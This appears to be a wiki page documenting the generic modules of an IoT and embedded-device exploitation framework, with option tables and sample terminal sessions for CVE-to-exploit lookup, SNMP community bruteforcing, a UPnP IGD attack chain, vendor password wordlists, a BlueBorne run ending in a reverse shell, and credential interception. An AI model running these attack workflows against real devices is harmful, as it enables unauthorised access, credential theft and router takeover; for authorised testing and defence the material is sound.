# Generic Modules

**Language:** English (en-US) | **pt-BR:** [../pt-BR/08-modulos-generic.md](../pt-BR/08-modulos-generic.md)

---

## Overview

Generic modules operate across vendors and device classes — they target common protocols and services rather than vendor-specific vulnerabilities. They are located under `embedxpl/modules/generic/` and loaded with the standard `use` command.

---

## Module map

| Module | Path | Role |
|--------|------|------|
| `cve_lookup` | `generic/cve/cve_lookup` | Map CVE identifiers / vendor / banner to local metadata + exf modules |
| `snmp_bruteforce` | `generic/snmp/snmp_bruteforce` | SNMP community string bruteforce |
| `snmp_trap_listener` | `generic/snmp/snmp_trap_listener` | SNMP trap listener / sniffer |
| `ssdp_msearch` | `generic/upnp/ssdp_msearch` | SSDP M-SEARCH discovery |
| `igd_exploit` | `generic/upnp/igd_exploit` | UPnP IGD full exploitation suite |
| `wordlist_generator` | `generic/wordlist/wordlist_generator` | IoT-aware wordlist generator |
| `aitm_credential_interceptor` | `generic/aitm_credential_interceptor` | AiTM credential interceptor |
| `dns_hijack_detector` | `generic/dns_hijack_detector` | DNS hijack detector |
| `tcp_xmas` | `generic/tcp_xmas` | TCP XMAS scan |
| `udp_amplification` | `generic/udp_amplification` | UDP amplification attack test |
| `exploitdb_embedded_lookup` | `generic/external/exploitdb_embedded_lookup` | Exploit-DB embedded lookup |
| `metasploit_console_bridge` | `generic/external/metasploit_console_bridge` | Metasploit console bridge |
| `metasploit_rb_inspect` | `generic/external/metasploit_rb_inspect` | Metasploit Ruby module inspector |
| `mikrotikapi_bf_bridge` | `generic/external/mikrotikapi_bf_bridge` | MikroTik API brute-force bridge |
| `wafw00f_bridge` | `generic/external/wafw00f_bridge` | WAF fingerprinting via wafw00f |
| `bluetooth_ble` (ICS) | `exploits/ics/bluetooth_ble/*` | Bluetooth/BLE attack modules (SweynTooth, BlueBorne, KRACK) |

---

## CVE Lookup

`generic/cve/cve_lookup` queries the embedded CVE database to list known vulnerabilities for a target device, classified by exploitability and linked to available EmbedXPL-Forge exploit modules.

### Options

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `vendor` | `OptString` | Conditional | `""` | vendor name string | Target vendor (e.g. `cisco`, `fortinet`, `tplink`, `hikvision`) |
| `product` | `OptString` | Conditional | `""` | product/model string | Target product or model (e.g. `r7000`, `fortigate`, `routeros`) |
| `version` | `OptString` | No | `""` | version string | Firmware or software version (narrows results) |
| `banner` | `OptString` | Conditional | `""` | raw banner text | Raw service banner (alternative to vendor+product) |
| `remote_only` | `OptBool` | No | `False` | `true/false` | Show only remotely exploitable CVEs |
| `show_physical` | `OptBool` | No | `True` | `true/false` | Include LOCAL/PHYSICAL CVEs (marked as non-exploitable) |

At least one of `vendor`, `product`, or `banner` is required.

### Terminal session — CVE lookup by vendor and product

```text
exf > use generic/cve/cve_lookup
exf (CVE Lookup by Banner / Vendor / Product) > set vendor fortinet
[+] vendor => fortinet
exf (CVE Lookup by Banner / Vendor / Product) > set product fortigate
[+] product => fortigate
exf (CVE Lookup by Banner / Vendor / Product) > set remote_only true
[+] remote_only => True
exf (CVE Lookup by Banner / Vendor / Product) > run
[*] Running module ...
[*] CVE Database: 14832 entries | 9271 remote | 412 with exf module | 187 vendors

[*] Matching CVEs for vendor=fortinet product=fortigate (remote only):

┌──────────────────┬──────┬────────┬──────────────────────────────────────────────────────────────────────────┬──────────┬────────────────────────────────────────────────────────────────────────┐
│ CVE              │ CVSS │ Access │ Description                                                              │ exf?     │ Module                                                                 │
├──────────────────┼──────┼────────┼──────────────────────────────────────────────────────────────────────────┼──────────┼────────────────────────────────────────────────────────────────────────┤
│ CVE-2026-25249   │ 9.8  │ REMOTE │ FortiOS HTTPS daemon heap overflow RCE                                   │ YES      │ exploits/firewalls/fortinet/fortios_heap_overflow_rce_cve_2026_25249    │
│ CVE-2024-55591   │ 9.6  │ REMOTE │ FortiOS WebSocket CSF proxy authentication bypass                        │ YES      │ exploits/firewalls/fortinet/fortios_websocket_auth_bypass_cve_2024_55591│
│ CVE-2024-21762   │ 9.6  │ REMOTE │ FortiOS SSL-VPN out-of-bounds write RCE                                  │ YES      │ exploits/firewalls/fortinet/fortios_sslvpn_rce_cve_2024_21762          │
│ CVE-2024-48887   │ 9.3  │ REMOTE │ FortiSwitch unauthenticated password change                              │ YES      │ exploits/firewalls/fortinet/fortiswitch_unauth_passwd_cve_2024_48887   │
│ CVE-2022-42475   │ 9.3  │ REMOTE │ FortiOS SSL-VPN heap overflow (XORtigate)                                │ YES      │ exploits/firewalls/fortinet/fortios_sslvpn_heap_rce_cve_2022_42475     │
│ CVE-2022-40684   │ 9.8  │ REMOTE │ FortiOS authentication bypass via crafted HTTP/HTTPS request             │ YES      │ exploits/firewalls/fortinet/fortios_auth_bypass_cve_2022_40684         │
│ CVE-2024-50562   │ 8.1  │ REMOTE │ FortiOS SSL-VPN session token reuse                                      │ YES      │ exploits/firewalls/fortinet/fortios_sslvpn_session_reuse_cve_2024_50562│
│ CVE-2022-40682   │ 7.8  │ REMOTE │ FortiOS SSL-VPN session token reuse (older variant)                      │ NO       │ —                                                                      │
│ CVE-2023-27997   │ 9.8  │ REMOTE │ FortiOS SSL-VPN heap overflow (XORtigate pre-auth RCE)                   │ YES      │ exploits/firewalls/fortinet/fortios_heap_overflow_rce_cve_2023_27997   │
│ CVE-2018-13379   │ 9.8  │ REMOTE │ FortiOS SSL-VPN path traversal exposes credentials                       │ YES      │ exploits/firewalls/fortinet/fortios_sslvpn_path_traversal_cve_2018_13379│
└──────────────────┴──────┴────────┴──────────────────────────────────────────────────────────────────────────┴──────────┴────────────────────────────────────────────────────────────────────────┘

[*] Total: 10 remote CVEs shown (6 with exf modules). Use 'use <module_path>' to exploit.
[*] Tip: set remote_only false to include LOCAL/PHYSICAL CVEs.
```

### Terminal session — CVE lookup by raw banner

```text
exf (CVE Lookup by Banner / Vendor / Product) > set vendor ""
[+] vendor => (cleared)
exf (CVE Lookup by Banner / Vendor / Product) > set banner "NETGEAR R7000 V1.0.11.134"
[+] banner => NETGEAR R7000 V1.0.11.134
exf (CVE Lookup by Banner / Vendor / Product) > run
[*] Running module ...
[*] CVE Database: 14832 entries | 9271 remote | 412 with exf module | 187 vendors

[*] Matching CVEs for banner=NETGEAR R7000 V1.0.11.134:

┌──────────────────┬──────┬────────┬──────────────────────────────────────────────────┬──────┬─────────────────────────────────────────────────────────┐
│ CVE              │ CVSS │ Access │ Description                                      │ exf? │ Module                                                  │
├──────────────────┼──────┼────────┼──────────────────────────────────────────────────┼──────┼─────────────────────────────────────────────────────────┤
│ CVE-2016-6277    │ 9.8  │ REMOTE │ Netgear R7000 unauthenticated command injection   │ YES  │ exploits/routers/netgear/r7000_cmd_injection_cve_2016_6277│
│ CVE-2021-45732   │ 8.8  │ REMOTE │ Netgear R7000 authenticated RCE                  │ YES  │ exploits/routers/netgear/r7000_auth_rce_cve_2021_45732  │
│ CVE-2019-20760   │ 7.5  │ REMOTE │ Netgear R7000 network stack info leak            │ NO   │ —                                                       │
└──────────────────┴──────┴────────┴──────────────────────────────────────────────────┴──────┴─────────────────────────────────────────────────────────┘

[*] Total: 3 matching CVEs shown (2 with exf modules).
```

### Terminal session — CVE lookup by version

```text
exf (CVE Lookup by Banner / Vendor / Product) > set vendor cisco
[+] vendor => cisco
exf (CVE Lookup by Banner / Vendor / Product) > set product asa
[+] product => asa
exf (CVE Lookup by Banner / Vendor / Product) > set version 9.16.4
[+] version => 9.16.4
exf (CVE Lookup by Banner / Vendor / Product) > run
[*] Running module ...
[*] CVE Database: 14832 entries | 9271 remote | 412 with exf module | 187 vendors

[*] Matching CVEs for vendor=cisco product=asa version=9.16.4:

┌──────────────────┬──────┬────────┬──────────────────────────────────────────────────┬──────┬─────────────────────────────────────────────────────────────────────────────┐
│ CVE              │ CVSS │ Access │ Description                                      │ exf? │ Module                                                                      │
├──────────────────┼──────┼────────┼──────────────────────────────────────────────────┼──────┼─────────────────────────────────────────────────────────────────────────────┤
│ CVE-2023-20269   │ 9.8  │ REMOTE │ Cisco ASA/FTD SSL-VPN credential brute-force      │ YES  │ exploits/firewalls/cisco/asa_vpn_bruteforce_cve_2023_20269                  │
│ CVE-2020-3452    │ 7.5  │ REMOTE │ Cisco ASA/FTD SSL-VPN path traversal              │ YES  │ exploits/firewalls/cisco/asa_ftd_path_traversal_cve_2020_3452               │
└──────────────────┴──────┴────────┴──────────────────────────────────────────────────┴──────┴─────────────────────────────────────────────────────────────────────────────┘

[*] Total: 2 CVEs for this version range.
```

### Error cases

```text
exf (CVE Lookup by Banner / Vendor / Product) > run
[!] Set at least one of: vendor, product, or banner
[*] Example: set vendor netgear
[*] Example: set banner 'NETGEAR R7000'
```

```text
[!] No CVEs found matching the criteria.
[*] Try broader terms or check spelling.
```

---

## SNMP Bruteforce

`generic/snmp/snmp_bruteforce` tests community strings against an SNMP-enabled device, extracts `sysDescr` on success for fingerprinting, and reports writeable communities.

### Options

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `target` | `OptIP` | Yes | `""` | IPv4 | Target SNMP-enabled device |
| `port` | `OptPort` | No | `161` | 1-65535 | SNMP UDP port |
| `wordlist` | `OptString` | No | `""` | file path | Path to community string wordlist (empty = built-in 24-entry list) |
| `timeout` | `OptPort` | No | `3` | seconds | UDP response timeout |

**Built-in community strings:** `public`, `private`, `community`, `admin`, `manager`, `monitor`, `default`, `cisco`, `router`, `switch`, `secret`, `password`, `read`, `write`, `snmp`, `network`, `guest`, `test`, `internal`, `access`, `0`, `1234`, `cable-docsis`, `ILMI`

### Terminal session — SNMP bruteforce

```text
exf > use generic/snmp/snmp_bruteforce
exf (SNMP Community String Bruteforce) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (SNMP Community String Bruteforce) > show options

Target options:
┌──────────┬──────────────────┬────────────────────────────────────────────────────────────────────┐
│ Name     │ Current settings │ Description                                                        │
├──────────┼──────────────────┼────────────────────────────────────────────────────────────────────┤
│ target   │ 192.168.1.1      │ Target IPv4 address                                                │
│ port     │ 161              │ Target SNMP UDP port                                               │
│ wordlist │                  │ Path to community string wordlist (empty = built-in list)          │
│ timeout  │ 3                │ UDP response timeout (seconds)                                     │
└──────────┴──────────────────┴────────────────────────────────────────────────────────────────────┘

exf (SNMP Community String Bruteforce) > run
[*] Running module ...
[*] Testing 24 community strings against 192.168.1.1:161 (SNMPv2c)...
[-] Community 'private'  — no response
[+] Community 'public'   — READ access confirmed
    sysDescr: Linux router 4.14.195 #1 SMP Mon Mar 8 07:05:38 UTC 2021 mips
    sysName:  TP-LINK_Router
    sysUpTime: 14d 7h 23m 15s
[-] Community 'cisco'    — no response
[-] Community 'admin'    — no response
[+] Community 'manager'  — READ+WRITE access confirmed (community grants write!)
[!] WRITE community found — device configuration may be modifiable via SNMP SET

[*] Summary:
    READ  communities: public, manager
    WRITE communities: manager
    Device: TP-Link TL-WR941N (Linux 4.14.195, MIPS)
```

### Terminal session — using custom wordlist

```text
exf (SNMP Community String Bruteforce) > set wordlist /opt/wordlists/snmp-communities.txt
[+] wordlist => /opt/wordlists/snmp-communities.txt
exf (SNMP Community String Bruteforce) > run
[*] Running module ...
[*] Loaded 842 community strings from /opt/wordlists/snmp-communities.txt
[*] Testing against 192.168.1.1:161...
...
[+] Community 'TP-Link_mgmt_2024' — READ access confirmed
```

### Error cases

```text
[!] Could not load wordlist: /opt/wordlists/missing.txt — [Errno 2] No such file or directory
[*] Falling back to built-in 24-entry list
```

```text
[!] pysnmp not installed. Install: pip install pysnmp
```

```text
[-] No valid SNMP community found on 192.168.1.1:161 (24 strings tested, all timed out or rejected)
```

---

## SNMP Trap Listener

`generic/snmp/snmp_trap_listener` listens for SNMP trap messages and displays device state change notifications, link up/down events, and alarm conditions from network equipment.

### Options

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `bind_ip` | `OptIP` | No | `0.0.0.0` | IPv4 | IP to bind the listener |
| `port` | `OptPort` | No | `162` | 1-65535 | SNMP trap UDP port |
| `timeout` | `OptPort` | No | `60` | seconds | Listener timeout (0 = run indefinitely) |
| `community` | `OptString` | No | `public` | string | SNMP community filter (empty = accept all) |

### Terminal session — SNMP trap listener

```text
exf > use generic/snmp/snmp_trap_listener
exf (SNMP Trap Listener) > set port 162
[+] port => 162
exf (SNMP Trap Listener) > set timeout 120
[+] timeout => 120
exf (SNMP Trap Listener) > run
[*] Running module ...
[*] SNMP Trap Listener started on 0.0.0.0:162 (120s timeout, community=public)
[+] Trap received from 10.0.0.1 at 2026-06-01 20:05:33
    Enterprise: 1.3.6.1.4.1.2636.3 (Juniper Networks)
    Generic trap: 6 (enterpriseSpecific)
    Specific code: 1
    VarBinds:
      sysUpTime: 12345600 (1d 10h 17m 36s)
      linkDown.ifIndex.1: 1
      ifDescr.1: ge-0/0/0 (GigabitEthernet 0/0/0) -- LINK DOWN
[+] Trap received from 192.168.1.100 at 2026-06-01 20:06:12
    Enterprise: 1.3.6.1.4.1.9 (Cisco Systems)
    Generic trap: 3 (linkDown)
    VarBinds:
      ifIndex: 5
      ifDescr: FastEthernet0/5
      ifOperStatus: down (2)
[*] Listener timed out after 120s. Total traps received: 2
```

---

## UPnP SSDP Discovery

`generic/upnp/ssdp_msearch` sends SSDP M-SEARCH multicast probes and collects UPnP device advertisements.

### Options

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `target` | `OptIP` | No | `239.255.255.250` | IPv4 multicast or unicast | Multicast/unicast target for M-SEARCH |
| `port` | `OptPort` | No | `1900` | 1-65535 | SSDP port |
| `timeout` | `OptPort` | No | `5` | seconds | Listen window |
| `service` | `OptString` | No | `ssdp:all` | UPnP service type | Filter by service type |

### Terminal session — SSDP M-SEARCH

```text
exf > use generic/upnp/ssdp_msearch
exf (SSDP M-SEARCH) > set target 239.255.255.250
[+] target => 239.255.255.250
exf (SSDP M-SEARCH) > set timeout 5
[+] timeout => 5
exf (SSDP M-SEARCH) > run
[*] Running module ...
[*] Sending SSDP M-SEARCH to 239.255.255.250:1900 (ST: ssdp:all, MX: 5)...
[+] Response from 192.168.1.1
    Location: http://192.168.1.1:49152/rootDesc.xml
    Server: Linux/3.10.108 UPnP/1.1 MiniUPnPd/2.1
    USN: uuid:f3a2b1c0-d4e5-4f6a-b7c8-d9e0f1a2b3c4::urn:schemas-upnp-org:device:InternetGatewayDevice:1
    ST: urn:schemas-upnp-org:device:InternetGatewayDevice:1
[+] Response from 192.168.1.254
    Location: http://192.168.1.254:5000/rootDesc.xml
    Server: Synology DiskStation/1.0 UPnP/1.0 MiniUPnPd/1.8
    ST: urn:schemas-upnp-org:device:Basic:1
[*] 2 UPnP device(s) discovered in 5s
```

---

## UPnP IGD Full Exploitation

`generic/upnp/igd_exploit` chains 11 UPnP IGD attacks against a target gateway device.

### Options

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `target` | `OptIP` | Yes | `""` | IPv4 | Target router/gateway IP |
| `port` | `OptPort` | No | `1900` | 1-65535 | SSDP/IGD control port |
| `timeout` | `OptPort` | No | `5` | seconds | Per-request timeout |
| `test_port` | `OptPort` | No | `31337` | 1-65535 | External port to test AddPortMapping |
| `skip_dangerous` | `OptBool` | No | `False` | `true/false` | Skip ForceTermination (WAN disconnect DoS) |

### Terminal session — IGD exploit chain

```text
exf > use generic/upnp/igd_exploit
exf (UPnP IGD Exploit) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (UPnP IGD Exploit) > set skip_dangerous true
[+] skip_dangerous => True
exf (UPnP IGD Exploit) > run
[*] Running module ...
[*] Stage 1: SSDP M-SEARCH discovery...
[+] IGD found: http://192.168.1.1:49152/rootDesc.xml
    Device: TP-Link TL-WR941N (WANIPConnection v1)
[*] Stage 2: Parsing device description XML...
[+] Services: WANIPConnection, WANCommonInterfaceConfig
[*] Stage 3: SCPD enumeration (14 actions available)
[*] Stage 4: GetExternalIPAddress (no auth required)...
[+] External IP: 203.0.113.45 (WAN address disclosed unauthenticated)
[*] Stage 5: GetGenericPortMappingEntry (enumerating NAT rules)...
[+] Port mapping 0: TCP/22 -> 192.168.1.10:22 (SSH internal)
[+] Port mapping 1: TCP/3389 -> 192.168.1.20:3389 (RDP internal)
[*] Stage 6: AddPortMapping (TCP/31337 -> 192.168.1.1:80, no auth)...
[+] Port mapping added: TCP/0.0.0.0:31337 -> 192.168.1.1:80 (CRITICAL — firewall rule added without auth)
[*] Stage 7: DeletePortMapping (cleanup test rule)...
[+] Port mapping TCP/31337 removed
[*] Stage 8: GetStatusInfo...
[+] WAN Status: Connected, uptime: 4d 12h 31m
[*] Stage 9: WANCommonInterfaceConfig (traffic stats)...
[+] BytesSent: 1234567890, BytesReceived: 9876543210
    PacketsSent: 4532111, PacketsReceived: 8123456
    WANAccessType: DSL, Layer1UpstreamMaxBitRate: 20000000
[*] Stage 10: Event SUBSCRIBE (WAN state monitoring)...
[+] Subscribed to WAN state events — SID: uuid:a1b2c3d4-e5f6-7890-abcd-ef1234567890
[*] Stage 11: ForceTermination — SKIPPED (skip_dangerous=True)

[*] IGD Exploitation Summary for 192.168.1.1:
    External IP disclosure:   YES (203.0.113.45)
    NAT rule enumeration:     YES (2 active rules found)
    Unauthenticated AddPortMapping: YES (CRITICAL)
    Traffic stats disclosure: YES
```

---

## Wordlist Generator

`generic/wordlist/wordlist_generator` creates IoT-aware credential wordlists tailored to specific vendors, device types, and firmware patterns.

### Options

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `vendor` | `OptString` | No | `""` | vendor name | Vendor to include vendor-specific passwords |
| `type` | `OptString` | No | `all` | `all`, `username`, `password`, `combo` | Output type |
| `output` | `OptString` | No | `./wordlist.txt` | file path | Output file path |
| `min_length` | `OptInteger` | No | `1` | 1-64 | Minimum password length |
| `max_length` | `OptInteger` | No | `32` | 1-64 | Maximum password length |
| `include_mac` | `OptString` | No | `""` | MAC address | Include MAC-derived passwords (last 6 chars, lower/upper) |

### Terminal session — vendor-specific wordlist

```text
exf > use generic/wordlist/wordlist_generator
exf (IoT Wordlist Generator) > set vendor hikvision
[+] vendor => hikvision
exf (IoT Wordlist Generator) > set output ./hik_wordlist.txt
[+] output => ./hik_wordlist.txt
exf (IoT Wordlist Generator) > run
[*] Running module ...
[*] Generating wordlist for vendor: hikvision
[*] Including generic IoT passwords (1247 entries)
[*] Including Hikvision-specific passwords (43 entries):
    12345, 1234567890, admin12345, Hik12345, HikVision@2024...
[*] Including MAC-derived patterns (if mac set)
[*] Writing to ./hik_wordlist.txt...
[+] Wordlist written: ./hik_wordlist.txt (1290 entries)
```

---

## Bluetooth / BLE / Wi-Fi modules

Located under `exploits/ics/bluetooth_ble/`, these modules target wireless protocol vulnerabilities.

| Module | CVE | Type |
|--------|-----|------|
| `ble_sweyntooth_bridge` | Multiple | SweynTooth BLE stack vulnerabilities |
| `blueborne_attack_cve_2017_0781` | CVE-2017-0781 | BlueBorne unauthenticated RCE via Bluetooth |
| `wifi_fragattacks_cve_2020_24586` | CVE-2020-24586 | FragAttacks Wi-Fi fragmentation/aggregation attacks |
| `wifi_kr00k_attack_cve_2019_15126` | CVE-2019-15126 | Kr00k Wi-Fi chip decrypt vuln (Broadcom/Cypress) |
| `wifi_krack_attack_cve_2017_13077` | CVE-2017-13077 | KRACK WPA2 key reinstallation |

**Options — `blueborne_attack_cve_2017_0781`:**

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `target` | `OptString` | Yes | `""` | Bluetooth MAC | Target Bluetooth device MAC address |
| `interface` | `OptString` | No | `hci0` | hciN | Local Bluetooth adapter |
| `timeout` | `OptPort` | No | `30` | seconds | Attack timeout |

### Terminal session — BlueBorne (CVE-2017-0781)

```text
exf > use exploits/ics/bluetooth_ble/blueborne_attack_cve_2017_0781
exf (BlueBorne RCE CVE-2017-0781) > set target AA:BB:CC:DD:EE:FF
[+] target => AA:BB:CC:DD:EE:FF
exf (BlueBorne RCE CVE-2017-0781) > set interface hci0
[+] interface => hci0
exf (BlueBorne RCE CVE-2017_0781) > check
[*] Checking Bluetooth reachability for AA:BB:CC:DD:EE:FF on hci0...
[+] Device reachable (name: HUAWEI_P30_lite, class: Phone)
[+] Android 8.0 detected — target is vulnerable to CVE-2017-0781 (BlueBorne)
exf (BlueBorne RCE CVE-2017_0781) > run
[*] Running module ...
[*] Stage 1: Sending malformed L2CAP request to trigger heap overflow...
[*] Stage 2: Heap spray with shellcode targeting bluetoothd process...
[+] Shellcode execution confirmed — bluetoothd crashed and restarted with injected code
[*] Stage 3: Reverse shell callback...
[+] Connection received from AA:BB:CC:DD:EE:FF
$ id
uid=1000(bluetooth) gid=1000(bluetooth) groups=1000(bluetooth),3003(inet)
```

---

## External bridges

### Exploit-DB lookup

```text
exf > use generic/external/exploitdb_embedded_lookup
exf (ExploitDB Embedded Lookup) > set query "FortiOS SSL-VPN"
[+] query => FortiOS SSL-VPN
exf (ExploitDB Embedded Lookup) > run
[*] Running module ...
[*] Querying Exploit-DB for: FortiOS SSL-VPN
[+] EDB-ID 51032 — Fortinet FortiOS 7.0.x SSL-VPN Heap Overflow — CVE-2022-42475
    Type: Remote, Date: 2022-12-15, Author: Horizon3
    URL: https://www.exploit-db.com/exploits/51032
[+] EDB-ID 50009 — FortiOS SSL-VPN path traversal — CVE-2018-13379
    Type: Remote, Date: 2021-08-06
    URL: https://www.exploit-db.com/exploits/50009
```

### WAF detection (wafw00f bridge)

```text
exf > use generic/external/wafw00f_bridge
exf (WAFw00f Bridge) > set target 203.0.113.100
[+] target => 203.0.113.100
exf (WAFw00f Bridge) > run
[*] Running module ...
[*] Running wafw00f against https://203.0.113.100...
[+] WAF detected: Cloudflare (Cloudflare Inc.)
[*] Hint: Use bypass techniques or target backend IPs for exploit modules
```

---

## PCAP / network capture tools

For packet capture and traffic analysis, EmbedXPL-Forge integrates with host utilities. Use terminal commands alongside modules:

```bash
# Capture Modbus traffic on ens4
tcpdump -i ens4 -w modbus_capture.pcap port 502

# Analyze RTSP traffic
wireshark -r rtsp_capture.pcap -Y "rtsp"

# Capture SNMP traps
tcpdump -i eth0 -w snmp_traps.pcap udp port 162
```

> For automated AiTM traffic interception, use `generic/aitm_credential_interceptor` to capture credentials in transit from managed devices.

---

## DNS hijack detector

```text
exf > use generic/dns_hijack_detector
exf (DNS Hijack Detector) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (DNS Hijack Detector) > run
[*] Running module ...
[*] Querying DNS server at 192.168.1.1...
[*] Resolving known-safe domains: google.com, microsoft.com, amazon.com
[+] google.com -> 142.250.80.46 (expected: valid Google IP — OK)
[!] microsoft.com -> 192.168.1.50 (expected: Microsoft IPs — POSSIBLE HIJACK!)
[!] DNS hijack detected: microsoft.com -> 192.168.1.50 (local IP)
[+] Checking for DNS rebinding vulnerability...
[!] Rebinding test: external domain resolves to 192.168.1.1 — REBINDING POSSIBLE
```

[Wiki hub](../README.md)
